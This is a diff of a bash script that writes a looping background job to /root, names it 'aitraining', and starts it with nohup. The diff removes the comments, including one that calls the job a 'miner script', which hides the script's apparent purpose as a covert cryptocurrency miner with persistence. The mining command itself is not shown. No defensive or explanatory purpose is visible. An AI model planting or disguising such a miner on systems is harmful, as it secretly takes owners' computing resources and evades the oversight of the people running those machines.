@@ -1,15 +1,6 @@
 #!/bin/bash
-
-# Define variables
 SERVICE_NAME="aitraining"
 SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"
-
-# Check for root privileges
-if [ "$(id -u)" -ne 0 ]; then
-  exit 1
-fi
-
-# Create the miner script with a loop
 cat <<'EOF' > "$SCRIPT_PATH"
 #!/bin/bash
 while true; do
@@ -19,9 +10,5 @@ while true; do
   sleep 10 # Add a delay before restarting in case of failure
 done
 EOF
-
-# Set permissions for the script
 chmod 700 "$SCRIPT_PATH"
-
-# Run the looping script in the background using nohup
 nohup "$SCRIPT_PATH" > /root/aitraining.log 2>&1 &
